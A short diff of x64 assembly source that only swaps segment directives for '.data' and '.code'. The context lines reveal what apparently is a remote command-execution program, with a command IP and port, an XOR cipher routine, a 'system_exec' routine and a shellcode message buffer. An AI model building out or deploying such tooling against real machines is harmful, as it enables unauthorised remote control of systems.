@@ -29,15 +29,15 @@ memcpy      proto   fastcall :qword, :qword, :dword
 xor_cipher  proto   fastcall :qword, :byte, :dword
 system_exec proto   fastcall :qword, :qword
 
-_data$00 segment page 'data'
+.data
     g_command_ip        db "127.0.0.1", 0
     g_command_port      dw 1664
     g_timeout           timeval <>
     g_timeout_sec       dw 5
     g_timeout_usec      dw 0
-_data$00 ends
 
-_text$00 segment align(10h) 'code'
+
+.code
 
     main proc
         local command_buffer:shellcode_msg
@@ -241,6 +241,6 @@ _text$00 segment align(10h) 'code'
         ret
     xor_cipher endp
 
-_text$00 ends
+
 
 end
